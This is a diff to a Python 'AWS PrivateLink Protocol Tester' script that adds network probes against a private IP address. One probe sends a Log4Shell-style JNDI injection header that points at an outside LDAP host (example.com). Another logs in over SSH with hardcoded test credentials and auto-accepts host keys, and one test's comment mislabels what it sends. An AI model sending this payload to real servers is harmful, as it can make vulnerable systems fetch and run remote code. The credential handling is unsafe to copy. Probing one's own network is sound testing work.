@@ -3,7 +3,11 @@ import socket
 import csv
 import datetime
 import os
+import paramiko
+import threading
+import time
 
+# Logging Function
 def log(message, log_dir, start_time):
     timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
     if log_dir:
@@ -12,7 +16,7 @@ def log(message, log_dir, start_time):
             f.write(f"[{timestamp}] {message}\n")
     print(f"[{timestamp}] {message}")
 
-
+# Report Writing Function
 def write_report(data, report_dir, start_time):
     if report_dir:
         report_file = os.path.join(report_dir, f"{start_time}-report.csv")
@@ -22,15 +26,16 @@ def write_report(data, report_dir, start_time):
             for entry in data:
                 writer.writerow(entry)
 
-
-def tcp_53_test(target_host, target_port, log_enabled, report_data, log_dir, start_time):
+# TCP 8080 Test with HTTP Header Injection
+def tcp_8080_header_injection_test(target_host, target_port, log_enabled, report_data, log_dir, start_time):
+    headers = "User-Agent: TestAgent\r\nX-Log4J: \${jndi:ldap://example.com/a}\r\n"
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.bind(('', 0))
         sock.settimeout(5)
         sock.connect((target_host, target_port))
         source_ip, source_port = sock.getsockname()
-        message = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_host)
+        message = f"GET / HTTP/1.1\r\nHost: {target_host}\r\n{headers}\r\n"
         sock.sendall(message.encode())
         response = sock.recv(4096)
         result = f"TCP Test Success: Source {source_ip}:{source_port} -> Destination {target_host}:{target_port} - Received response"
@@ -38,45 +43,84 @@ def tcp_53_test(target_host, target_port, log_enabled, report_data, log_dir, sta
             log(result, log_dir, start_time)
         report_data.append([datetime.datetime.now(), "TCP", source_ip, source_port, target_host, target_port, "Success"])
     except Exception as e:
-        source_ip, source_port = sock.getsockname()
-        result = f"TCP Test Failed: Source {source_ip}:{source_port} -> Destination {target_host}:{target_port} - Error: {e}"
+        result = f"TCP Test Failed: {e}"
         if log_enabled:
             log(result, log_dir, start_time)
-        report_data.append([datetime.datetime.now(), "TCP", source_ip, source_port, target_host, target_port, "Failed"])
+        report_data.append([datetime.datetime.now(), "TCP", "N/A", "N/A", target_host, target_port, "Failed"])
     finally:
         sock.close()
 
-
-def tcp_8080_test(target_host, target_port, log_enabled, report_data, log_dir, start_time):
+# TCP SYN with Random Header Data on port 8081
+def tcp_syn_random_header_test(target_host, target_port, log_enabled, report_data, log_dir, start_time):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.bind(('', 0))
         sock.settimeout(5)
         sock.connect((target_host, target_port))
         source_ip, source_port = sock.getsockname()
-        message = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_host)
+        # Custom data in SYN packet
+        message = f"SYN Random Data Test from {source_ip}"
         sock.sendall(message.encode())
         response = sock.recv(4096)
-        result = f"TCP Test Success: Source {source_ip}:{source_port} -> Destination {target_host}:{target_port} - Received response"
+        result = f"TCP SYN with Random Header Test Success: Source {source_ip}:{source_port} -> Destination {target_host}:{target_port} - Received response"
         if log_enabled:
             log(result, log_dir, start_time)
         report_data.append([datetime.datetime.now(), "TCP", source_ip, source_port, target_host, target_port, "Success"])
     except Exception as e:
-        source_ip, source_port = sock.getsockname()
-        result = f"TCP Test Failed: Source {source_ip}:{source_port} -> Destination {target_host}:{target_port} - Error: {e}"
+        result = f"TCP SYN with Random Header Test Failed: {e}"
         if log_enabled:
             log(result, log_dir, start_time)
-        report_data.append([datetime.datetime.now(), "TCP", source_ip, source_port, target_host, target_port, "Failed"])
+        report_data.append([datetime.datetime.now(), "TCP", "N/A", "N/A", target_host, target_port, "Failed"])
     finally:
         sock.close()
 
+# SSH on TCP/53 with DNS through SSH Tunnel
+def ssh_tcp_53_dns_test(target_host, log_enabled, report_data, log_dir, start_time):
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh_client.connect(target_host, port=53, username='testuser', password='testpassword')
+        source_ip = "local"
+        source_port = "53"
+        _, stdout, _ = ssh_client.exec_command('dig @127.0.0.1 example.com')
+        result = stdout.read().decode()
+        if log_enabled:
+            log(f"SSH Tunnel DNS Test: {result}", log_dir, start_time)
+        report_data.append([datetime.datetime.now(), "SSH", source_ip, source_port, target_host, 53, "Success"])
+    except Exception as e:
+        if log_enabled:
+            log(f"SSH Tunnel DNS Test Failed: {e}", log_dir, start_time)
+        report_data.append([datetime.datetime.now(), "SSH", "local", 53, target_host, 53, "Failed"])
+    finally:
+        ssh_client.close()
 
+# TCP Fast Open Test
+def tcp_fast_open_test(target_host, target_port, log_enabled, report_data, log_dir, start_time):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
+        sock.bind(('', 0))
+        sock.connect((target_host, target_port))
+        source_ip, source_port = sock.getsockname()
+        message = "Hello from TCP Fast Open"
+        sock.send(message.encode())
+        result = f"TCP Fast Open Test: Source {source_ip}:{source_port} -> Destination {target_host}:{target_port}"
+        if log_enabled:
+            log(result, log_dir, start_time)
+        report_data.append([datetime.datetime.now(), "TCP", source_ip, source_port, target_host, target_port, "Success"])
+    except Exception as e:
+        if log_enabled:
+            log(f"TCP Fast Open Test Failed: {e}", log_dir, start_time)
+        report_data.append([datetime.datetime.now(), "TCP", "N/A", "N/A", target_host, target_port, "Failed"])
+    finally:
+        sock.close()
+
+# Main Function
 def main():
     parser = argparse.ArgumentParser(description="AWS PrivateLink Protocol Tester")
     parser.add_argument("--log", action='store_true', help="Generate a full log file with $day/hour/minute-log.txt.")
     parser.add_argument("--report", action='store_true', help="Generate a CSV report with $day/hour/minute-report.csv.")
     parser.add_argument("--both", action='store_true', help="Generate both log and report files.")
-    parser.add_argument("--shell", action='store_true', help="Output only to the shell without writing any files.")
     args = parser.parse_args()
 
     if not any(vars(args).values()):
@@ -85,11 +129,8 @@ def main():
 
     log_enabled = args.log or args.both
     report_enabled = args.report or args.both
-    shell_enabled = args.shell
-
+    
     target_host = "10.1.2.69"
-    tcp_port_53 = 53
-    tcp_port_8080 = 8080
     report_data = []
     start_time = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
 
@@ -101,10 +142,12 @@ def main():
     else:
         log_dir = None
 
-    # Run tcp 53 test
-    tcp_53_test(target_host, tcp_port_53, log_enabled or shell_enabled, report_data, log_dir, start_time)
-    # Run tcp 8080 test
-    tcp_8080_test(target_host, tcp_port_8080, log_enabled or shell_enabled, report_data, log_dir, start_time)
+    # Run test cases 5 times each
+    for _ in range(5):
+        tcp_8080_header_injection_test(target_host, 8080, log_enabled, report_data, log_dir, start_time)
+        ssh_tcp_53_dns_test(target_host, log_enabled, report_data, log_dir, start_time)
+        tcp_syn_random_header_test(target_host, 8081, log_enabled, report_data, log_dir, start_time)
+        tcp_fast_open_test(target_host, 8082, log_enabled, report_data, log_dir, start_time)
 
     if report_enabled:
         write_report(report_data, report_dir, start_time)
